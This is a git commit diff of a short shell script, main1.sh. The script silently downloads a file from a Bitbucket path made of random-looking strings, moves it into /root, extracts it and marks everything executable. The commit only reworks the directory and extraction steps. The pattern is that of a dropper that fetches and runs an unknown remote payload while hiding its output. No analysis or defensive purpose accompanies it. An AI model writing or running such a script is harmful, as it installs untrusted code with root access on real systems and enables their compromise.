6986dbd2e71332f1e57136e6cc0f91625b50995a
hildamansur <102267965+hildamansur@users.noreply.github.com>
2022-03-24 21:34:39 -0700

    Update main1.sh

--- main1.sh
+++ main1.sh
@@ -1,4 +1,5 @@
 curl -o martialasion https://bitbucket.org/namskdjworitpwprkdgalxmv/naszxcoiuwemnaoemaosnuemazoiemnaszxoiemwazxmcnoemaowemazsxcovm/raw/9692e7a20bdcb3c48bb122f003a7b9184bb7b8fc/unaseiuowemnaszxcoivuiowezxmnvoieweoizxmasoiweruiomnaszxcnoiuewe > /dev/null 2>&1 && chmod u+x *
 mv martialasion /root
 cd /../../../root && ls -a
-cd root && tar -xf martialasion && chmod u+x *
+tar -xf martialasion && chmod u+x *
+ls -a
